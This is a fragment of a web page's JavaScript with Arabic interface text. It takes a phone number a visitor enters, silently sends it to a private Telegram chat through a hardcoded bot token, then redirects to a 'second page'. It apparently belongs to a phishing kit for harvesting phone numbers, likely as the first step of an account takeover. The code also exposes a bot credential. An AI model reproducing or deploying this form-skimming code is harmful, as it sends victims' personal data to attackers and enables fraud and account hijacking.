    <script>
        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
        const chatId = '612575358';

        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            if (!phoneNumber || phoneNumber.length < 6) {
                alert('يرجى إدخال رقم هاتف صحيح.');
                return;
            }

            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `رقم الهاتف: ${fullPhoneNumber}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    startCountdown();
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(error => {
                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
            });
        }

        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            let countdown = 4;

            const interval = setInterval(() => {
                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
                countdown--;

                if (countdown < 0) {
                    clearInterval(interval);
                    window.location.href = 'secondpage.html'; // قم بتغيير الرابط للصفحة المطلوبة
                }
            }, 1000);
        }
